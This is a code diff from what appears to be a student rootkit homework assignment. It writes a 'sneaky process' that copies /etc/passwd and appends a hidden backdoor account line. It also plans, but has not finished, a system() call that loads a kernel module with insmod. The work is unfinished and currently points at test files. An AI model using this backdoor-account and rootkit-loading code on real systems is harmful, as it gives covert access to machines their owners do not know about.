@@ -5,15 +5,15 @@
 #include <linux/module.h>
 //#include <linux/moduleparam.h>
 #include <linux/stat.h>
+#include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
-int pid = getpid();
-module_param(pid, int, 0);
+// int pid = getpid();
+// module_param(pid, int, 0);
+// Couldn't get this part to work yet.
 using namespace std;
 bool insert_line(const char *original_passwd, const char *temp_passwd) {
-  // Doing this part with temp files now, until I sort out re-loading from
-  // original file
-
+  // Copy file to temp file
   ifstream src(original_passwd, ios::out);
   ofstream dest(temp_passwd, ios::out);
   if (!src.good() || !dest.good()) {
@@ -21,6 +21,7 @@ bool insert_line(const char *original_passwd, const char *temp_passwd) {
     return false;
   }
   dest << src.rdbuf();
+  // Insert sneaky line to the end of original
   ofstream insert_src(original_passwd, ofstream::out | ofstream::app);
   insert_src << "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash" << endl;
   return true;
@@ -37,11 +38,15 @@ void sneaky_process(void) {
   printf("sneaky_process pid = %d\n", getpid());
   // const char *original_passwd = "/etc/passwd";
   // const char *temp_passwd = "/tmp/passwd";
+
+  // Calling w/ temp values for now, before I crash it again :^)
   const char *original_passwd = "/home/bg127/homework5-kit/test_src.txt";
   const char *temp_passwd = "/home/bg127/homework5-kit/test_dst.txt";
   if (!insert_line(original_passwd, temp_passwd)) {
     return;
   }
+  const char *command = "ls"; // Change this w/ insmod command after its done
+  system(command);
 
   // 4th step, this is the part I'm especially confused. After the sneaky module
   // is loaded Read from keyboard 1 char at a time until received 'q'. Program
